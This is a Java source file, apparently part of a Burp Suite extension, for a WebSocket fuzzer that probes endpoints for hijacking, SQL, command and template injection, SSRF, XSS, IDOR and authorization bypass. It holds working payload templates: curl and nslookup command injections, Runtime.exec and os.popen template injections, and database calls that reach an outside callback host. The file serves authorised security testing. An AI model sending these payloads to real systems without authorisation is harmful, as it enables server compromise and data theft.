package com.omnistrike.modules.websocket;

import burp.api.montoya.MontoyaApi;
import com.omnistrike.framework.ActiveScanExecutor;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.model.*;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.WebSocket;
import java.nio.ByteBuffer;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Active WebSocket fuzzer with OOB-first strategy.
 * Opens parallel WebSocket connections to inject payloads for each vulnerability category.
 * Collaborator (OOB) payloads are always sent first; in-band detection is fallback only.
 *
 * IMPORTANT: Only runs when user explicitly clicks "Scan" in the UI.
 */
public class WebSocketFuzzer {

    private static final String MODULE_ID = "ws-scanner";
    private static final int PAYLOAD_DELAY_MS = 500;
    private static final int RESPONSE_TIMEOUT_MS = 10000;

    private MontoyaApi api;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;
    private DeduplicationStore dedup;
    private ActiveScanExecutor executor;
    private Consumer<String> logger;

    // Scan state
    private final AtomicBoolean scanning = new AtomicBoolean(false);
    private final AtomicInteger findingsCount = new AtomicInteger(0);
    private final AtomicInteger payloadsSent = new AtomicInteger(0);
    private volatile Future<?> currentScanFuture;
    private volatile String scanStatus = "Idle";

    // SQL error patterns for in-band detection
    private static final String[] SQL_ERROR_STRINGS = {
            "SQL syntax", "mysql_fetch", "ORA-0", "ORA-1",
            "PostgreSQL", "pg_query", "sqlite3.", "SQLite3::",
            "Microsoft OLE DB", "ODBC SQL Server", "Unclosed quotation mark",
            "java.sql.SQL", "JDBC", "SqlException",
            "near \"syntax\"", "syntax error at or near"
    };

    // SSTI math evaluation pattern
    private static final Pattern SSTI_MATH_PATTERN = Pattern.compile("(?<![0-9])49(?![0-9])");

    // Numeric/UUID ID patterns for IDOR detection
    private static final Pattern NUMERIC_ID_PATTERN = Pattern.compile("\"(?:id|user_id|userId|account_id|accountId|order_id|orderId)\"\\s*:\\s*(\\d+)");
    private static final Pattern UUID_ID_PATTERN = Pattern.compile("\"(?:id|user_id|userId|account_id|accountId)\"\\s*:\\s*\"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})\"");

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    public void setApi(MontoyaApi api) {
        this.api = api;
    }

    public void setExecutor(ActiveScanExecutor executor) {
        this.executor = executor;
    }

    public void setLogger(Consumer<String> logger) {
        this.logger = logger;
    }

    public boolean isScanning() {
        return scanning.get();
    }

    public String getScanStatus() {
        return scanStatus;
    }

    public int getFindingsCount() {
        return findingsCount.get();
    }

    public int getPayloadsSent() {
        return payloadsSent.get();
    }

    /**
     * Start active fuzzing on the given WebSocket connection.
     * Runs asynchronously via the ActiveScanExecutor.
     */
    public void startScan(WebSocketConnection connection) {
        if (scanning.getAndSet(true)) {
            log("Scan already in progress");
            return;
        }

        findingsCount.set(0);
        payloadsSent.set(0);
        scanStatus = "Starting scan on " + connection.getUpgradeUrl();
        log(scanStatus);

        currentScanFuture = executor.submitTracked(() -> {
            try {
                runAllTests(connection);
            } catch (Exception e) {
                logError("Scan error: " + e.getMessage());
            } finally {
                scanning.set(false);
                scanStatus = "Scan complete. Findings: " + findingsCount.get()
                        + ", Payloads: " + payloadsSent.get();
                log(scanStatus);
            }
        });
    }

    /**
     * Stop the current scan.
     */
    public void stopScan() {
        if (currentScanFuture != null) {
            currentScanFuture.cancel(true);
        }
        scanning.set(false);
        scanStatus = "Scan stopped by user";
        log(scanStatus);
    }

    /**
     * Runs all test categories sequentially on the target connection.
     */
    private void runAllTests(WebSocketConnection connection) {
        String wsUrl = connection.getUpgradeUrl();

        if (Thread.currentThread().isInterrupted()) return;
        scanStatus = "Testing: Cross-Site WebSocket Hijacking";
        testCSWSH(connection);

        if (Thread.currentThread().isInterrupted()) return;
        scanStatus = "Testing: SQL Injection (OOB)";
        testSQLi(connection, wsUrl);

        if (Thread.currentThread().isInterrupted()) return;
        scanStatus = "Testing: Command Injection (OOB)";
        testCommandInjection(connection, wsUrl);

        if (Thread.currentThread().isInterrupted()) return;
        scanStatus = "Testing: SSRF (OOB)";
        testSSRF(connection, wsUrl);

        if (Thread.currentThread().isInterrupted()) return;
        scanStatus = "Testing: SSTI (OOB)";
        testSSTI(connection, wsUrl);

        if (Thread.currentThread().isInterrupted()) return;
        scanStatus = "Testing: XSS Reflection";
        testXSS(connection, wsUrl);

        if (Thread.currentThread().isInterrupted()) return;
        scanStatus = "Testing: IDOR";
        testIDOR(connection, wsUrl);

        if (Thread.currentThread().isInterrupted()) return;
        scanStatus = "Testing: AuthZ Bypass";
        testAuthZBypass(connection, wsUrl);
    }

    // ==================== CSWSH ====================

    /**
     * Cross-Site WebSocket Hijacking: Send upgrade with evil Origin.
     * Binary accept/reject test — no OOB needed.
     */
    private void testCSWSH(WebSocketConnection connection) {
        if (!dedupCheck(connection.getUpgradeUrl(), "cswsh")) return;

        try {
            String wsUrl = connection.getUpgradeUrl();
            URI uri = URI.create(wsUrl.replace("wss://", "https://").replace("ws://", "http://"));

            // Build a WebSocket connection with a spoofed Origin header
            HttpClient client = HttpClient.newBuilder()
                    .connectTimeout(Duration.ofSeconds(10))
                    .build();

            CompletableFuture<WebSocket> wsFuture = client.newWebSocketBuilder()
                    .header("Origin", "https://evil-attacker.com")
                    .buildAsync(uri, new WebSocket.Listener() {});

            WebSocket ws = wsFuture.get(10, TimeUnit.SECONDS);
            // If we get here, server accepted the connection with evil origin
            ws.sendClose(WebSocket.NORMAL_CLOSURE, "test complete");

            addFinding(Finding.builder(MODULE_ID, "Cross-Site WebSocket Hijacking (CSWSH)",
                            Severity.HIGH, Confidence.CERTAIN)
                    .url(wsUrl)
                    .evidence("Server accepted WebSocket upgrade with Origin: https://evil-attacker.com")
                    .description("The WebSocket endpoint does not validate the Origin header. " +
                            "An attacker can hijack authenticated WebSocket connections from a victim's browser " +
                            "by hosting a malicious page that opens a WebSocket to this endpoint.")
                    .remediation("Validate the Origin header on WebSocket upgrade requests. " +
                            "Reject connections from unexpected origins.")
                    .payload("Origin: https://evil-attacker.com")
                    .build());

        } catch (TimeoutException e) {
            // Connection timed out — server may have rejected
            log("CSWSH test: connection timed out (likely not vulnerable)");
        } catch (ExecutionException e) {
            // Connection rejected — not vulnerable
            log("CSWSH test: connection rejected (not vulnerable)");
        } catch (Exception e) {
            logError("CSWSH test error: " + e.getMessage());
        }
    }

    // ==================== SQL Injection ====================

    private void testSQLi(WebSocketConnection connection, String wsUrl) {
        if (!dedupCheck(wsUrl, "sqli")) return;

        List<String> sampleMessages = getClientMessages(connection);
        if (sampleMessages.isEmpty()) {
            log("SQLi: No client messages to fuzz");
            return;
        }

        // Phase 1: OOB payloads
        boolean oobAvailable = collaboratorManager != null && collaboratorManager.isAvailable();
        if (oobAvailable) {
            String[] oobTemplates = {
                    "'; EXEC xp_dirtree('\\\\%s\\a')--",
                    "' || (SELECT extractvalue(xmltype('<!DOCTYPE x SYSTEM \"http://%s/x\">'),'/x'))--",
                    "'; COPY (SELECT '') TO PROGRAM 'nslookup %s'--",
                    "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', '%s', '\\\\a'))--"
            };

            for (String template : oobTemplates) {
                if (Thread.currentThread().isInterrupted()) return;
                String collabPayload = collaboratorManager.generatePayload(
                        MODULE_ID, wsUrl, "ws-message", "OOB SQLi via WebSocket",
                        interaction -> addFinding(Finding.builder(MODULE_ID,
                                        "SQL Injection in WebSocket (OOB Confirmed)",
                                        Severity.HIGH, Confidence.CERTAIN)
                                .url(wsUrl)
                                .evidence("Collaborator interaction received: " + interaction.type()
                                        + " from " + interaction.clientIp())
                                .description("SQL injection confirmed via out-of-band interaction. " +
                                        "The WebSocket endpoint is vulnerable to SQL injection.")
                                .remediation("Use parameterized queries for all database operations triggered by WebSocket messages.")
                                .build()));

                if (collabPayload == null) break;

                String payload = String.format(template, collabPayload);
                for (String original : sampleMessages) {
                    sendFuzzPayload(connection, injectIntoMessage(original, payload));
                }
            }
        }

        // Phase 2: In-band error-based fallback
        String[] errorPayloads = {"'", "\"", "' OR '1'='1", "1 OR 1=1--", "' AND 1=CONVERT(int,@@version)--"};
        for (String payload : errorPayloads) {
            if (Thread.currentThread().isInterrupted()) return;
            for (String original : sampleMessages) {
                String response = sendAndReceive(connection, injectIntoMessage(original, payload));
                if (response != null && containsSqlError(response)) {
                    addFinding(Finding.builder(MODULE_ID, "SQL Injection in WebSocket (Error-Based)",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(wsUrl)
                            .evidence("SQL error in response after injection: " + extractSqlError(response))
                            .description("SQL injection detected via error-based analysis in WebSocket messages.")
                            .remediation("Use parameterized queries for all database operations triggered by WebSocket messages.")
                            .payload(payload)
                            .responseEvidence(extractSqlError(response))
                            .build());
                    return; // One confirmed finding is enough
                }
            }
        }
    }

    // ==================== Command Injection ====================

    private void testCommandInjection(WebSocketConnection connection, String wsUrl) {
        if (!dedupCheck(wsUrl, "cmdi")) return;

        List<String> sampleMessages = getClientMessages(connection);
        if (sampleMessages.isEmpty()) return;

        // Phase 1: OOB
        boolean oobAvailable = collaboratorManager != null && collaboratorManager.isAvailable();
        if (oobAvailable) {
            String[] oobTemplates = {
                    "`nslookup %s`",
                    "$(curl %s)",
                    "| ping -c1 %s",
                    "\nnslookup %s\n",
                    ";curl http://%s;",
                    "& nslookup %s &"
            };

            for (String template : oobTemplates) {
                if (Thread.currentThread().isInterrupted()) return;
                String collabPayload = collaboratorManager.generatePayload(
                        MODULE_ID, wsUrl, "ws-message", "OOB Command Injection via WebSocket",
                        interaction -> addFinding(Finding.builder(MODULE_ID,
                                        "Command Injection in WebSocket (OOB Confirmed)",
                                        Severity.HIGH, Confidence.CERTAIN)
                                .url(wsUrl)
                                .evidence("Collaborator interaction received: " + interaction.type()
                                        + " from " + interaction.clientIp())
                                .description("OS command injection confirmed via out-of-band interaction. " +
                                        "The WebSocket endpoint passes user input to system commands.")
                                .remediation("Never pass WebSocket message content to OS commands. Use safe APIs instead.")
                                .build()));

                if (collabPayload == null) break;

                String payload = String.format(template, collabPayload);
                for (String original : sampleMessages) {
                    sendFuzzPayload(connection, injectIntoMessage(original, payload));
                }
            }
        }

        // Phase 2: Time-based fallback (requires >=4s delta, tested 3x)
        for (String original : sampleMessages) {
            if (Thread.currentThread().isInterrupted()) return;

            long[] sleepTimes = new long[3];
            long[] baselineTimes = new long[3];
            boolean consistent = true;

            for (int i = 0; i < 3 && !Thread.currentThread().isInterrupted(); i++) {
                // Baseline (sleep 0)
                long start1 = System.currentTimeMillis();
                sendAndReceive(connection, injectIntoMessage(original, ";sleep 0;"));
                baselineTimes[i] = System.currentTimeMillis() - start1;

                delay(PAYLOAD_DELAY_MS);

                // Delay payload (sleep 5)
                long start2 = System.currentTimeMillis();
                sendAndReceive(connection, injectIntoMessage(original, ";sleep 5;"));
                sleepTimes[i] = System.currentTimeMillis() - start2;

                // Check if delta is significant
                if (sleepTimes[i] - baselineTimes[i] < 4000) {
                    consistent = false;
                    break;
                }

                delay(PAYLOAD_DELAY_MS);
            }

            if (consistent) {
                addFinding(Finding.builder(MODULE_ID, "Command Injection in WebSocket (Time-Based)",
                                Severity.HIGH, Confidence.FIRM)
                        .url(wsUrl)
                        .evidence("Consistent time delay detected: baseline avg="
                                + avg(baselineTimes) + "ms, sleep avg=" + avg(sleepTimes) + "ms (3 trials)")
                        .description("OS command injection detected via time-based analysis. " +
                                "The ;sleep 5; payload consistently caused a >4 second delay across 3 trials.")
                        .remediation("Never pass WebSocket message content to OS commands.")
                        .payload(";sleep 5;")
                        .build());
                return;
            }
        }
    }

    // ==================== SSRF ====================

    private void testSSRF(WebSocketConnection connection, String wsUrl) {
        if (!dedupCheck(wsUrl, "ssrf")) return;

        List<String> sampleMessages = getClientMessages(connection);
        if (sampleMessages.isEmpty()) return;

        // OOB only — no meaningful in-band fallback for blind SSRF
        if (collaboratorManager == null || !collaboratorManager.isAvailable()) {
            log("SSRF: Collaborator not available, skipping (no in-band fallback for blind SSRF)");
            return;
        }

        // Look for URL-like values in messages to inject into
        Pattern urlParam = Pattern.compile("\"(?:url|uri|href|link|src|redirect|callback|webhook|endpoint|target|dest)\"\\s*:\\s*\"([^\"]+)\"",
                Pattern.CASE_INSENSITIVE);

        for (String original : sampleMessages) {
            if (Thread.currentThread().isInterrupted()) return;

            Matcher m = urlParam.matcher(original);
            if (m.find()) {
                for (String scheme : new String[]{"http://", "https://"}) {
                    String collabPayload = collaboratorManager.generatePayload(
                            MODULE_ID, wsUrl, "ws-message", "OOB SSRF via WebSocket",
                            interaction -> addFinding(Finding.builder(MODULE_ID,
                                            "SSRF in WebSocket (OOB Confirmed)",
                                            Severity.HIGH, Confidence.CERTAIN)
                                    .url(wsUrl)
                                    .evidence("Collaborator interaction received: " + interaction.type()
                                            + " from " + interaction.clientIp())
                                    .description("Server-Side Request Forgery confirmed via out-of-band interaction. " +
                                            "The server followed a URL provided in a WebSocket message.")
                                    .remediation("Validate and whitelist allowed URLs in WebSocket messages. " +
                                            "Do not follow arbitrary URLs from user input.")
                                    .build()));

                    if (collabPayload == null) break;

                    String injected = original.substring(0, m.start(1))
                            + scheme + collabPayload + "/ssrf"
                            + original.substring(m.end(1));
                    sendFuzzPayload(connection, injected);
                }
            }
        }
    }

    // ==================== SSTI ====================

    private void testSSTI(WebSocketConnection connection, String wsUrl) {
        if (!dedupCheck(wsUrl, "ssti")) return;

        List<String> sampleMessages = getClientMessages(connection);
        if (sampleMessages.isEmpty()) return;

        // Phase 1: OOB
        boolean oobAvailable = collaboratorManager != null && collaboratorManager.isAvailable();
        if (oobAvailable) {
            String[] oobTemplates = {
                    "{{config.__class__.__init__.__globals__['os'].popen('nslookup %s').read()}}",
                    "${T(java.lang.Runtime).getRuntime().exec('nslookup %s')}",
                    "<%= `nslookup %s` %%>",
                    "#{`nslookup %s`}"
            };

            for (String template : oobTemplates) {
                if (Thread.currentThread().isInterrupted()) return;
                String collabPayload = collaboratorManager.generatePayload(
                        MODULE_ID, wsUrl, "ws-message", "OOB SSTI via WebSocket",
                        interaction -> addFinding(Finding.builder(MODULE_ID,
                                        "SSTI in WebSocket (OOB Confirmed)",
                                        Severity.HIGH, Confidence.CERTAIN)
                                .url(wsUrl)
                                .evidence("Collaborator interaction received: " + interaction.type()
                                        + " from " + interaction.clientIp())
                                .description("Server-Side Template Injection confirmed via out-of-band interaction. " +
                                        "The server evaluated a template expression from a WebSocket message.")
                                .remediation("Never pass user input directly into template engines. Use sandboxed rendering.")
                                .build()));

                if (collabPayload == null) break;

                String payload = String.format(template, collabPayload);
                for (String original : sampleMessages) {
                    sendFuzzPayload(connection, injectIntoMessage(original, payload));
                }
            }
        }

        // Phase 2: Math evaluation fallback
        for (String original : sampleMessages) {
            if (Thread.currentThread().isInterrupted()) return;

            String payload = "{{7*7}}";
            String response = sendAndReceive(connection, injectIntoMessage(original, payload));
            if (response != null && SSTI_MATH_PATTERN.matcher(response).find()
                    && !original.contains("49")) {
                addFinding(Finding.builder(MODULE_ID, "SSTI in WebSocket (Math Evaluation)",
                                Severity.HIGH, Confidence.FIRM)
                        .url(wsUrl)
                        .evidence("Template expression {{7*7}} evaluated to 49 in response")
                        .description("Server-Side Template Injection detected. The server evaluated " +
                                "{{7*7}} and returned 49 in the WebSocket response.")
                        .remediation("Never pass user input directly into template engines.")
                        .payload(payload)
                        .responseEvidence("49")
                        .build());
                return;
            }
        }
    }

    // ==================== XSS ====================

    private void testXSS(WebSocketConnection connection, String wsUrl) {
        if (!dedupCheck(wsUrl, "xss")) return;

        List<String> sampleMessages = getClientMessages(connection);
        if (sampleMessages.isEmpty()) return;

        // Primary: Inject unique canary, check reflection
        String canary = "<xss" + ThreadLocalRandom.current().nextInt(10000, 99999) + ">";
        for (String original : sampleMessages) {
            if (Thread.currentThread().isInterrupted()) return;

            String response = sendAndReceive(connection, injectIntoMessage(original, canary));
            if (response != null && response.contains(canary)) {
                // Canary reflected unescaped
                addFinding(Finding.builder(MODULE_ID, "Reflected XSS via WebSocket",
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(wsUrl)
                        .evidence("Injected canary '" + canary + "' reflected unescaped in server response")
                        .description("The WebSocket server reflects user input without HTML encoding. " +
                                "If this content is rendered in a browser DOM, it enables Cross-Site Scripting.")
                        .remediation("HTML-encode all user input before reflecting it in WebSocket responses or rendering in the DOM.")
                        .payload(canary)
                        .responseEvidence(canary)
                        .build());
                return;
            }
        }

        // OOB XSS (if browser renders WS content)
        if (collaboratorManager != null && collaboratorManager.isAvailable()) {
            String collabPayload = collaboratorManager.generatePayload(
                    MODULE_ID, wsUrl, "ws-message", "OOB XSS via WebSocket",
                    interaction -> addFinding(Finding.builder(MODULE_ID,
                                    "XSS in WebSocket (OOB Confirmed)",
                                    Severity.MEDIUM, Confidence.CERTAIN)
                            .url(wsUrl)
                            .evidence("Collaborator interaction: " + interaction.type()
                                    + " — browser executed injected payload")
                            .description("Cross-Site Scripting confirmed via out-of-band interaction. " +
                                    "The browser executed an injected script from a WebSocket message.")
                            .remediation("HTML-encode all WebSocket message content before DOM insertion.")
                            .build()));

            if (collabPayload != null) {
                String xssPayload = "<img src=x onerror=fetch('http://" + collabPayload + "')>";
                for (String original : sampleMessages) {
                    sendFuzzPayload(connection, injectIntoMessage(original, xssPayload));
                }
            }
        }
    }

    // ==================== IDOR ====================

    private void testIDOR(WebSocketConnection connection, String wsUrl) {
        if (!dedupCheck(wsUrl, "idor")) return;

        List<String> sampleMessages = getClientMessages(connection);
        if (sampleMessages.isEmpty()) return;

        for (String original : sampleMessages) {
            if (Thread.currentThread().isInterrupted()) return;

            // Try numeric IDs
            Matcher numMatcher = NUMERIC_ID_PATTERN.matcher(original);
            if (numMatcher.find()) {
                String idValue = numMatcher.group(1);
                try {
                    long id = Long.parseLong(idValue);
                    // Try adjacent IDs
                    for (long offset : new long[]{1, -1}) {
                        long testId = id + offset;
                        if (testId < 0) continue;

                        String modified = original.substring(0, numMatcher.start(1))
                                + testId
                                + original.substring(numMatcher.end(1));

                        String baseResponse = sendAndReceive(connection, original);
                        delay(PAYLOAD_DELAY_MS);
                        String testResponse = sendAndReceive(connection, modified);

                        if (baseResponse != null && testResponse != null
                                && !testResponse.isEmpty()
                                && !isErrorResponse(testResponse)
                                && !testResponse.equals(baseResponse)) {
                            addFinding(Finding.builder(MODULE_ID, "Potential IDOR in WebSocket",
                                            Severity.MEDIUM, Confidence.TENTATIVE)
                                    .url(wsUrl)
                                    .parameter("id=" + idValue)
                                    .evidence("Changed ID from " + id + " to " + testId
                                            + ": received different valid response (" + testResponse.length() + " chars)")
                                    .description("Changing a numeric ID in a WebSocket message returned different valid data. " +
                                            "This may indicate an Insecure Direct Object Reference allowing access to other users' data. " +
                                            "Manual verification required.")
                                    .remediation("Implement server-side authorization checks for all resource access via WebSocket.")
                                    .payload(modified)
                                    .build());
                            return;
                        }
                    }
                } catch (NumberFormatException ignored) {}
            }
        }
    }

    // ==================== AuthZ Bypass ====================

    private void testAuthZBypass(WebSocketConnection connection, String wsUrl) {
        if (!dedupCheck(wsUrl, "authz")) return;

        List<String> sampleMessages = getClientMessages(connection);
        if (sampleMessages.isEmpty()) return;

        try {
            // Open an unauthenticated connection (no cookies/auth headers)
            URI uri = URI.create(wsUrl.replace("wss://", "https://").replace("ws://", "http://"));

            HttpClient client = HttpClient.newBuilder()
                    .connectTimeout(Duration.ofSeconds(10))
                    .build();

            // Build without auth headers
            CompletableFuture<WebSocket> wsFuture = client.newWebSocketBuilder()
                    .buildAsync(uri, new WebSocket.Listener() {});

            WebSocket unauthWs;
            try {
                unauthWs = wsFuture.get(10, TimeUnit.SECONDS);
            } catch (Exception e) {
                log("AuthZ: Could not open unauthenticated connection (likely auth required)");
                return;
            }

            // Replay authenticated messages on unauthenticated connection
            for (String message : sampleMessages) {
                if (Thread.currentThread().isInterrupted()) {
                    unauthWs.sendClose(WebSocket.NORMAL_CLOSURE, "cancelled");
                    return;
                }

                String authResponse = sendAndReceive(connection, message);
                delay(PAYLOAD_DELAY_MS);

                // Send same message on unauth connection
                CompletableFuture<String> responseFuture = new CompletableFuture<>();
                WebSocket.Listener listener = new WebSocket.Listener() {
                    private final StringBuilder sb = new StringBuilder();
                    @Override
                    public CompletionStage<?> onText(WebSocket webSocket, CharSequence data, boolean last) {
                        sb.append(data);
                        if (last) responseFuture.complete(sb.toString());
                        webSocket.request(1);
                        return null;
                    }
                };

                // Re-register listener by sending and reading
                unauthWs.sendText(message, true);
                payloadsSent.incrementAndGet();

                String unauthResponse;
                try {
                    unauthResponse = responseFuture.get(RESPONSE_TIMEOUT_MS, TimeUnit.MILLISECONDS);
                } catch (TimeoutException e) {
                    continue;
                }

                if (authResponse != null && unauthResponse != null
                        && !unauthResponse.isEmpty()
                        && !isErrorResponse(unauthResponse)
                        && unauthResponse.equals(authResponse)) {
                    addFinding(Finding.builder(MODULE_ID, "WebSocket Authorization Bypass",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(wsUrl)
                            .evidence("Unauthenticated connection received same response as authenticated: "
                                    + truncate(unauthResponse, 200))
                            .description("The WebSocket endpoint returns identical data for authenticated and " +
                                    "unauthenticated connections. The server may not validate session credentials on WebSocket messages.")
                            .remediation("Validate authentication and authorization on every WebSocket message, " +
                                    "not just on the upgrade request.")
                            .payload(message)
                            .build());
                    unauthWs.sendClose(WebSocket.NORMAL_CLOSURE, "test complete");
                    return;
                }
            }

            unauthWs.sendClose(WebSocket.NORMAL_CLOSURE, "test complete");

        } catch (Exception e) {
            logError("AuthZ bypass test error: " + e.getMessage());
        }
    }

    // ==================== Helper Methods ====================

    /**
     * Gets sample client-to-server messages from the connection history.
     * Returns up to 5 unique text messages to use as fuzz targets.
     */
    private List<String> getClientMessages(WebSocketConnection connection) {
        List<String> messages = new ArrayList<>();
        Set<String> seen = new HashSet<>();
        for (WebSocketMessage msg : connection.getMessages()) {
            if (msg.getDirection() == WebSocketMessage.Direction.CLIENT_TO_SERVER
                    && msg.isText() && msg.getPayload() != null) {
                String payload = msg.getPayload();
                if (!payload.isEmpty() && seen.add(payload) && messages.size() < 5) {
                    messages.add(payload);
                }
            }
        }
        return messages;
    }

    /**
     * Injects a payload into the most likely injection point of a message.
     * For JSON messages, appends to the first string value found.
     * For plain text, appends the payload.
     */
    private String injectIntoMessage(String original, String payload) {
        // Try JSON string value injection
        if (original.trim().startsWith("{") || original.trim().startsWith("[")) {
            // Find first string value and append payload
            Pattern jsonStr = Pattern.compile("(\"[^\"]+\"\\s*:\\s*\")(.*?)(\")", Pattern.DOTALL);
            Matcher m = jsonStr.matcher(original);
            if (m.find()) {
                return original.substring(0, m.start(2))
                        + m.group(2) + payload
                        + original.substring(m.end(2));
            }
        }
        // Fallback: append to message
        return original + payload;
    }

    /**
     * Opens a fresh WebSocket connection and sends a payload, then reads the response.
     * Returns the server's response text, or null on error/timeout.
     */
    private String sendAndReceive(WebSocketConnection connection, String message) {
        try {
            String wsUrl = connection.getUpgradeUrl();
            URI uri = URI.create(wsUrl.replace("wss://", "https://").replace("ws://", "http://"));

            HttpClient client = HttpClient.newBuilder()
                    .connectTimeout(Duration.ofSeconds(10))
                    .build();

            // Replay original upgrade headers
            var builder = client.newWebSocketBuilder();
            if (connection.getUpgradeRequest() != null) {
                for (var header : connection.getUpgradeRequest().headers()) {
                    String name = header.name().toLowerCase();
                    // Skip hop-by-hop and WebSocket-specific headers
                    if (name.equals("host") || name.equals("upgrade") || name.equals("connection")
                            || name.startsWith("sec-websocket") || name.equals("content-length")) {
                        continue;
                    }
                    try {
                        builder.header(header.name(), header.value());
                    } catch (IllegalArgumentException ignored) {
                        // Some headers can't be set on the builder
                    }
                }
            }

            CompletableFuture<String> responseFuture = new CompletableFuture<>();
            StringBuilder responseBuilder = new StringBuilder();

            WebSocket ws = builder.buildAsync(uri, new WebSocket.Listener() {
                @Override
                public CompletionStage<?> onText(WebSocket webSocket, CharSequence data, boolean last) {
                    responseBuilder.append(data);
                    if (last) {
                        responseFuture.complete(responseBuilder.toString());
                    }
                    webSocket.request(1);
                    return null;
                }

                @Override
                public CompletionStage<?> onClose(WebSocket webSocket, int statusCode, String reason) {
                    if (!responseFuture.isDone()) {
                        responseFuture.complete(responseBuilder.toString());
                    }
                    return null;
                }

                @Override
                public void onError(WebSocket webSocket, Throwable error) {
                    if (!responseFuture.isDone()) {
                        responseFuture.complete(null);
                    }
                }
            }).get(10, TimeUnit.SECONDS);

            ws.request(1);
            ws.sendText(message, true);
            payloadsSent.incrementAndGet();

            String response = responseFuture.get(RESPONSE_TIMEOUT_MS, TimeUnit.MILLISECONDS);
            ws.sendClose(WebSocket.NORMAL_CLOSURE, "done");
            return response;

        } catch (TimeoutException e) {
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Sends a payload without waiting for response (fire-and-forget for OOB).
     */
    private void sendFuzzPayload(WebSocketConnection connection, String message) {
        try {
            String wsUrl = connection.getUpgradeUrl();
            URI uri = URI.create(wsUrl.replace("wss://", "https://").replace("ws://", "http://"));

            HttpClient client = HttpClient.newBuilder()
                    .connectTimeout(Duration.ofSeconds(10))
                    .build();

            var wsBuilder = client.newWebSocketBuilder();
            if (connection.getUpgradeRequest() != null) {
                for (var header : connection.getUpgradeRequest().headers()) {
                    String name = header.name().toLowerCase();
                    if (name.equals("host") || name.equals("upgrade") || name.equals("connection")
                            || name.startsWith("sec-websocket") || name.equals("content-length")) {
                        continue;
                    }
                    try {
                        wsBuilder.header(header.name(), header.value());
                    } catch (IllegalArgumentException ignored) {}
                }
            }

            WebSocket ws = wsBuilder.buildAsync(uri, new WebSocket.Listener() {}).get(10, TimeUnit.SECONDS);
            ws.sendText(message, true);
            payloadsSent.incrementAndGet();
            delay(PAYLOAD_DELAY_MS);
            ws.sendClose(WebSocket.NORMAL_CLOSURE, "done");

        } catch (Exception e) {
            // Fire and forget — errors are expected for OOB payloads
        }
    }

    private boolean containsSqlError(String response) {
        for (String error : SQL_ERROR_STRINGS) {
            if (response.contains(error)) return true;
        }
        return false;
    }

    private String extractSqlError(String response) {
        for (String error : SQL_ERROR_STRINGS) {
            int idx = response.indexOf(error);
            if (idx >= 0) {
                int start = Math.max(0, idx - 20);
                int end = Math.min(response.length(), idx + error.length() + 50);
                return response.substring(start, end);
            }
        }
        return "";
    }

    private boolean isErrorResponse(String response) {
        if (response == null) return true;
        String lower = response.toLowerCase();
        return lower.contains("\"error\"") || lower.contains("unauthorized")
                || lower.contains("forbidden") || lower.contains("not found")
                || lower.contains("invalid") || lower.contains("denied");
    }

    private boolean dedupCheck(String wsUrl, String testType) {
        if (dedup == null) return true;
        return dedup.markIfNew(MODULE_ID, wsUrl, testType);
    }

    private void addFinding(Finding finding) {
        findingsCount.incrementAndGet();
        if (findingsStore != null) {
            findingsStore.addFinding(finding);
        }
    }

    private void delay(int ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private long avg(long[] values) {
        long sum = 0;
        for (long v : values) sum += v;
        return values.length > 0 ? sum / values.length : 0;
    }

    private String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }

    private void log(String message) {
        Consumer<String> l = logger;
        if (l != null) {
            l.accept(message);
        }
        try {
            if (api != null) api.logging().logToOutput("[WS-Fuzzer] " + message);
        } catch (Exception ignored) {}
    }

    private void logError(String message) {
        try {
            if (api != null) api.logging().logToError("[WS-Fuzzer] " + message);
        } catch (Exception ignored) {}
    }

    public void shutdown() {
        stopScan();
    }
}
